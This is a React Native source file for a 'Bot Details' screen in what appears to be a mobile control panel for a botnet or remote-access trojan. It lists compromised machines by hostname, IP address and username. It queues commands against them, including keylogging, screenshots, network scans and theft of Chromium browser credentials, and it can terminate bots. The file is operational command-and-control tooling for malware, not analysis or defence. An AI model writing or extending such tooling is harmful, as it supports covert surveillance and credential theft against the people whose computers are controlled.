// Bot Details Screen Component

import React, { useState, useEffect } from 'react';
import {
  View,
  Text,
  StyleSheet,
  ScrollView,
  TouchableOpacity,
  Alert,
  ActivityIndicator,
} from 'react-native';
import { Ionicons } from '@expo/vector-icons';
import { useNavigation, useRoute } from '@react-navigation/native';

// Import services and types
import apiService from '../../services/api';
import { Bot, Command, SystemInfo, NetworkScan, ProcessList } from '../../types';
import { COLORS, SPACING, FONT_SIZES, BORDER_RADIUS, SHADOWS } from '../../constants';

interface RouteParams {
  botId: string;
}

export default function BotDetailsScreen() {
  const navigation = useNavigation();
  const route = useRoute();
  const { botId } = route.params as RouteParams;

  const [bot, setBot] = useState<Bot | null>(null);
  const [loading, setLoading] = useState(true);
  const [systemInfo, setSystemInfo] = useState<SystemInfo | null>(null);
  const [networkScan, setNetworkScan] = useState<NetworkScan | null>(null);
  const [processList, setProcessList] = useState<ProcessList | null>(null);
  const [commandHistory, setCommandHistory] = useState<Command[]>([]);

  useEffect(() => {
    loadBotDetails();
  }, [botId]);

  const loadBotDetails = async () => {
    try {
      setLoading(true);

      // Load bot basic info
      const botsResult = await apiService.getBots();
      if (botsResult.success && botsResult.data) {
        const foundBot = botsResult.data.find(b => b.id === botId);
        if (foundBot) {
          setBot(foundBot);
        } else {
          Alert.alert('Error', 'Bot not found');
          navigation.goBack();
          return;
        }
      }

      // Load command history for this bot
      const tasksResult = await apiService.getTasks();
      if (tasksResult.success && tasksResult.data) {
        const botCommands = tasksResult.data
          .filter(task => task.bot_id === botId)
          .map(task => ({
            id: task.id,
            bot_id: task.bot_id,
            command: task.command,
            args: task.args ? JSON.parse(task.args) : undefined,
            timestamp: task.created_at,
            status: task.status,
            result: task.result,
          }))
          .slice(0, 10); // Last 10 commands
        setCommandHistory(botCommands);
      }

    } catch (error) {
      console.error('Failed to load bot details:', error);
      Alert.alert('Error', 'Failed to load bot details');
    } finally {
      setLoading(false);
    }
  };

  const sendCommand = (commandType: string) => {
    if (!bot) return;

    let command = '';
    let args = {};

    switch (commandType) {
      case 'system_info':
        command = 'system_info';
        break;
      case 'network_scan':
        command = 'network_scan';
        break;
      case 'process_list':
        command = 'process_list';
        break;
      case 'screenshot':
        command = 'screenshot';
        break;
      case 'keylogger':
        command = 'keylogger';
        break;
      default:
        return;
    }

    navigation.navigate('Commands', {
      prefillBot: bot,
      prefillCommand: command,
      prefillArgs: args,
    });
  };

  const terminateBot = () => {
    if (!bot) return;

    Alert.alert(
      'Terminate Bot',
      `Are you sure you want to terminate ${bot.hostname || bot.id}?`,
      [
        { text: 'Cancel', style: 'cancel' },
        {
          text: 'Terminate',
          style: 'destructive',
          onPress: async () => {
            try {
              const result = await apiService.terminateBot(bot.id);
              if (result.success) {
                Alert.alert('Success', 'Bot termination command sent');
                navigation.goBack();
              } else {
                Alert.alert('Error', 'Failed to terminate bot');
              }
            } catch (error) {
              Alert.alert('Error', 'Failed to terminate bot');
            }
          },
        },
      ]
    );
  };

  const getStatusColor = (status: string) => {
    switch (status.toLowerCase()) {
      case 'active':
        return COLORS.success;
      case 'inactive':
        return COLORS.warning;
      case 'offline':
        return COLORS.error;
      default:
        return COLORS.info;
    }
  };

  const getStatusIcon = (status: string) => {
    switch (status.toLowerCase()) {
      case 'active':
        return 'radio-button-on';
      case 'inactive':
        return 'radio-button-off';
      case 'offline':
        return 'cloud-offline';
      default:
        return 'help-circle';
    }
  };

  const ActionButton = ({ title, icon, onPress, disabled = false }: {
    title: string;
    icon: keyof typeof Ionicons.glyphMap;
    onPress: () => void;
    disabled?: boolean;
  }) => (
    <TouchableOpacity
      style={[styles.actionButton, disabled && styles.actionButtonDisabled]}
      onPress={onPress}
      disabled={disabled}
    >
      <Ionicons name={icon} size={24} color={disabled ? COLORS.textMuted : COLORS.primary} />
      <Text style={[styles.actionButtonText, disabled && styles.actionButtonTextDisabled]}>
        {title}
      </Text>
    </TouchableOpacity>
  );

  const CommandHistoryItem = ({ command }: { command: Command }) => (
    <View style={styles.commandItem}>
      <View style={styles.commandHeader}>
        <Text style={styles.commandText} numberOfLines={1}>
          {command.command}
        </Text>
        <View style={[styles.statusBadge, { backgroundColor: getStatusColor(command.status) }]}>
          <Text style={styles.statusBadgeText}>{command.status}</Text>
        </View>
      </View>
      <Text style={styles.commandTimestamp}>
        {new Date(command.timestamp).toLocaleString()}
      </Text>
      {command.result && (
        <Text style={styles.commandResult} numberOfLines={2}>
          Result: {command.result}
        </Text>
      )}
    </View>
  );

  if (loading) {
    return (
      <View style={styles.loadingContainer}>
        <ActivityIndicator size="large" color={COLORS.primary} />
        <Text style={styles.loadingText}>Loading bot details...</Text>
      </View>
    );
  }

  if (!bot) {
    return (
      <View style={styles.errorContainer}>
        <Ionicons name="alert-circle" size={80} color={COLORS.error} />
        <Text style={styles.errorTitle}>Bot Not Found</Text>
        <Text style={styles.errorSubtitle}>The requested bot could not be found</Text>
        <TouchableOpacity style={styles.backButton} onPress={() => navigation.goBack()}>
          <Text style={styles.backButtonText}>Go Back</Text>
        </TouchableOpacity>
      </View>
    );
  }

  return (
    <ScrollView style={styles.container} showsVerticalScrollIndicator={false}>
      {/* Bot Header */}
      <View style={styles.header}>
        <View style={styles.botIcon}>
          <Ionicons name="hardware-chip" size={40} color={COLORS.primary} />
        </View>
        <View style={styles.botInfo}>
          <Text style={styles.botName}>{bot.hostname || bot.id}</Text>
          <Text style={styles.botIp}>{bot.ip_address}</Text>
          <View style={styles.statusContainer}>
            <Ionicons name={getStatusIcon(bot.status)} size={16} color={getStatusColor(bot.status)} />
            <Text style={[styles.botStatus, { color: getStatusColor(bot.status) }]}>
              {bot.status.toUpperCase()}
            </Text>
          </View>
        </View>
        <TouchableOpacity style={styles.terminateButton} onPress={terminateBot}>
          <Ionicons name="power" size={24} color={COLORS.error} />
        </TouchableOpacity>
      </View>

      {/* Bot Details */}
      <View style={styles.detailsContainer}>
        <Text style={styles.sectionTitle}>Bot Information</Text>

        <View style={styles.detailRow}>
          <Text style={styles.detailLabel}>Operating System:</Text>
          <Text style={styles.detailValue}>{bot.os_info}</Text>
        </View>

        <View style={styles.detailRow}>
          <Text style={styles.detailLabel}>Username:</Text>
          <Text style={styles.detailValue}>{bot.username}</Text>
        </View>

        <View style={styles.detailRow}>
          <Text style={styles.detailLabel}>Registered:</Text>
          <Text style={styles.detailValue}>
            {new Date(bot.registered_at).toLocaleString()}
          </Text>
        </View>

        <View style={styles.detailRow}>
          <Text style={styles.detailLabel}>Last Seen:</Text>
          <Text style={styles.detailValue}>
            {bot.last_seen ? new Date(bot.last_seen).toLocaleString() : 'Never'}
          </Text>
        </View>

        <Text style={styles.capabilitiesTitle}>Capabilities:</Text>
        <View style={styles.capabilitiesContainer}>
          {Object.entries(bot.capabilities).map(([key, enabled]) => (
            <View key={key} style={[styles.capabilityChip, enabled && styles.capabilityChipEnabled]}>
              <Text style={[styles.capabilityText, enabled && styles.capabilityTextEnabled]}>
                {key.replace('_', ' ')}
              </Text>
            </View>
          ))}
        </View>
      </View>

      {/* Quick Actions */}
      <View style={styles.actionsContainer}>
        <Text style={styles.sectionTitle}>Quick Actions</Text>
        <View style={styles.actionsGrid}>
          <ActionButton
            title="System Info"
            icon="information-circle"
            onPress={() => sendCommand('system_info')}
            disabled={!bot.capabilities.system_info}
          />
          <ActionButton
            title="Network Scan"
            icon="wifi"
            onPress={() => sendCommand('network_scan')}
            disabled={!bot.capabilities.network_scan}
          />
          <ActionButton
            title="Process List"
            icon="list"
            onPress={() => sendCommand('process_list')}
            disabled={!bot.capabilities.process_list}
          />
          <ActionButton
            title="Screenshot"
            icon="camera"
            onPress={() => sendCommand('screenshot')}
            disabled={!bot.capabilities.screenshot}
          />
          <ActionButton
            title="Keylogger"
            icon="keyboard"
            onPress={() => sendCommand('keylogger')}
            disabled={!bot.capabilities.keylogger}
          />
          <ActionButton
            title="Browser Data"
            icon="browsers"
            onPress={() => sendCommand('browser_data')}
            disabled={!bot.capabilities.chromium_credentials}
          />
        </View>
      </View>

      {/* Command History */}
      <View style={styles.historyContainer}>
        <Text style={styles.sectionTitle}>Recent Commands</Text>
        {commandHistory.length > 0 ? (
          commandHistory.map((command) => (
            <CommandHistoryItem key={command.id} command={command} />
          ))
        ) : (
          <Text style={styles.emptyText}>No command history available</Text>
        )}
      </View>
    </ScrollView>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: COLORS.background,
  },
  loadingContainer: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    backgroundColor: COLORS.background,
  },
  loadingText: {
    fontSize: FONT_SIZES.lg,
    color: COLORS.textSecondary,
    marginTop: SPACING.md,
  },
  errorContainer: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    backgroundColor: COLORS.background,
    padding: SPACING.lg,
  },
  errorTitle: {
    fontSize: FONT_SIZES.xl,
    fontWeight: 'bold',
    color: COLORS.error,
    marginTop: SPACING.lg,
  },
  errorSubtitle: {
    fontSize: FONT_SIZES.md,
    color: COLORS.textSecondary,
    textAlign: 'center',
    marginTop: SPACING.sm,
  },
  backButton: {
    marginTop: SPACING.lg,
    padding: SPACING.md,
    backgroundColor: COLORS.primary,
    borderRadius: BORDER_RADIUS.md,
  },
  backButtonText: {
    color: '#ffffff',
    fontSize: FONT_SIZES.md,
    fontWeight: 'bold',
  },
  header: {
    flexDirection: 'row',
    alignItems: 'center',
    padding: SPACING.lg,
    backgroundColor: COLORS.surface,
    borderBottomWidth: 1,
    borderBottomColor: COLORS.border,
  },
  botIcon: {
    width: 70,
    height: 70,
    borderRadius: 35,
    backgroundColor: COLORS.surfaceVariant,
    justifyContent: 'center',
    alignItems: 'center',
    marginRight: SPACING.md,
  },
  botInfo: {
    flex: 1,
  },
  botName: {
    fontSize: FONT_SIZES.xl,
    fontWeight: 'bold',
    color: COLORS.text,
  },
  botIp: {
    fontSize: FONT_SIZES.md,
    color: COLORS.textSecondary,
    marginTop: SPACING.xs,
  },
  statusContainer: {
    flexDirection: 'row',
    alignItems: 'center',
    marginTop: SPACING.xs,
  },
  botStatus: {
    fontSize: FONT_SIZES.sm,
    fontWeight: 'bold',
    marginLeft: SPACING.xs,
  },
  terminateButton: {
    padding: SPACING.sm,
  },
  detailsContainer: {
    backgroundColor: COLORS.surface,
    margin: SPACING.md,
    padding: SPACING.lg,
    borderRadius: BORDER_RADIUS.lg,
    ...SHADOWS.md,
  },
  sectionTitle: {
    fontSize: FONT_SIZES.lg,
    fontWeight: 'bold',
    color: COLORS.text,
    marginBottom: SPACING.md,
  },
  detailRow: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
    paddingVertical: SPACING.sm,
    borderBottomWidth: 1,
    borderBottomColor: COLORS.borderLight,
  },
  detailLabel: {
    fontSize: FONT_SIZES.md,
    color: COLORS.text,
    fontWeight: '500',
  },
  detailValue: {
    fontSize: FONT_SIZES.md,
    color: COLORS.textSecondary,
    flex: 1,
    textAlign: 'right',
    marginLeft: SPACING.md,
  },
  capabilitiesTitle: {
    fontSize: FONT_SIZES.md,
    fontWeight: 'bold',
    color: COLORS.text,
    marginTop: SPACING.md,
    marginBottom: SPACING.sm,
  },
  capabilitiesContainer: {
    flexDirection: 'row',
    flexWrap: 'wrap',
  },
  capabilityChip: {
    backgroundColor: COLORS.surfaceVariant,
    paddingHorizontal: SPACING.sm,
    paddingVertical: SPACING.xs,
    borderRadius: BORDER_RADIUS.sm,
    marginRight: SPACING.sm,
    marginBottom: SPACING.sm,
  },
  capabilityChipEnabled: {
    backgroundColor: COLORS.primary,
  },
  capabilityText: {
    fontSize: FONT_SIZES.sm,
    color: COLORS.textSecondary,
  },
  capabilityTextEnabled: {
    color: '#ffffff',
    fontWeight: '500',
  },
  actionsContainer: {
    backgroundColor: COLORS.surface,
    margin: SPACING.md,
    padding: SPACING.lg,
    borderRadius: BORDER_RADIUS.lg,
    ...SHADOWS.md,
  },
  actionsGrid: {
    flexDirection: 'row',
    flexWrap: 'wrap',
    justifyContent: 'space-between',
  },
  actionButton: {
    width: '48%',
    backgroundColor: COLORS.surfaceVariant,
    padding: SPACING.md,
    borderRadius: BORDER_RADIUS.md,
    alignItems: 'center',
    marginBottom: SPACING.md,
    ...SHADOWS.sm,
  },
  actionButtonDisabled: {
    backgroundColor: COLORS.surfaceVariant,
    opacity: 0.5,
  },
  actionButtonText: {
    fontSize: FONT_SIZES.sm,
    color: COLORS.primary,
    marginTop: SPACING.xs,
    fontWeight: '500',
  },
  actionButtonTextDisabled: {
    color: COLORS.textMuted,
  },
  historyContainer: {
    backgroundColor: COLORS.surface,
    margin: SPACING.md,
    padding: SPACING.lg,
    borderRadius: BORDER_RADIUS.lg,
    ...SHADOWS.md,
    marginBottom: SPACING.xxl,
  },
  commandItem: {
    backgroundColor: COLORS.surfaceVariant,
    padding: SPACING.md,
    borderRadius: BORDER_RADIUS.md,
    marginBottom: SPACING.sm,
  },
  commandHeader: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
    marginBottom: SPACING.xs,
  },
  commandText: {
    fontSize: FONT_SIZES.md,
    fontWeight: '500',
    color: COLORS.text,
    flex: 1,
  },
  statusBadge: {
    paddingHorizontal: SPACING.sm,
    paddingVertical: SPACING.xs,
    borderRadius: BORDER_RADIUS.sm,
  },
  statusBadgeText: {
    fontSize: FONT_SIZES.xs,
    color: '#ffffff',
    fontWeight: 'bold',
  },
  commandTimestamp: {
    fontSize: FONT_SIZES.sm,
    color: COLORS.textMuted,
  },
  commandResult: {
    fontSize: FONT_SIZES.sm,
    color: COLORS.textSecondary,
    marginTop: SPACING.xs,
  },
  emptyText: {
    fontSize: FONT_SIZES.md,
    color: COLORS.textMuted,
    textAlign: 'center',
    padding: SPACING.lg,
  },
});
